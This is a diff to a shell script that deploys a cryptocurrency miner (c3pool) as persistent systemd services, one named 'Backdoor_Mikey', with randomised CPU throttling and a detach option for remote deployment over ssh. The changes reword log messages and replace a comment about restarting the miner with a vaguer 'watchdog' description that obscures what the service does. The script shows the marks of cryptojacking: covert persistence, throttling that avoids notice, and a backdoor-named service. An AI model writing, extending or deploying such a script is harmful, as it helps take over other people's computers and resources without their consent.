@@ -31,7 +31,7 @@ DIR=$InstDIR/c3pool
 # each random period of time. These bounds will be applied to each virtual CPU thread.
 CPU_min_lim=50
 CPU_max_lim=75
-# Daemon: service which ensures to restart if the miner terminates unexpectedly
+# watchdog is a backed system service which monitors that all processes are running properly
 watchdog=true
 # Detatched (only needed for remote deploy to detatch process from ssh connection)
 detatched=true
@@ -192,10 +192,11 @@ EOL
     log "..... Mikey daemon is here ....."
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
+    sudo systemctl reset-failed
 }
 function shuffler () {
     # SHUFFLE
-    log "Creating Shuffling Service"
+    log "Invoke shuffling service ..."
     cat >/tmp/shuffle.service <<EOL
   [Unit]
 Description=Shuffle
@@ -208,11 +209,10 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/shuffle.service /etc/systemd/system/shuffle.service
-    log "shuffle service initiated ..."
+    log "shuffle service initiated ."
     sudo systemctl enable shuffle.service
     sudo systemctl start shuffle.service
     sudo systemctl reset-failed
-    log "miner will start shortly ..."
 }
 function build () {
     # kill existing miner instance
@@ -226,6 +226,7 @@ function build () {
     # trigger daemon or script directly
     if [[ $watchdog == true ]]; then
         daemon & shuffler
+        log "miner will start shortly ..."
     else
         shuffle &
         runMiner
